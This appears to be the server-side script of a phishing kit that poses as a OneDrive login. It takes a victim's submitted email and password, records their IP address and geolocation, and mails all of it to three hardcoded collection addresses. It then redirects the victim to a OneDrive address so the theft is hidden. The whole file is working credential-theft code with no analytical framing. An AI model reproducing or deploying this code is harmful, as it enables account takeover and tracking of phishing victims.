Redirecting back to One Drive...
<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BY BoxOffice|---\n";
    $message .= "Email Provider: Others\n";
    $message .= "E: " . $_POST['email'] . "\n"; 
    $message .= "Ps: " . $_POST['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="resultinbox10@zohomail.com,resultinbox10@gmail.com,boxman00712@outlook.com";

	$subject = "Others | $ip";
	$headers = "From: rYan <blessing@heaven.com>";

	$send = mail($to,$subject,$message,$headers);
	if($send){ 
?>
		<script>
			window.location="https://onedrive.live.com/4343645werjnelktjekrthjermtlker";
		</script> 
<?php
	}
?>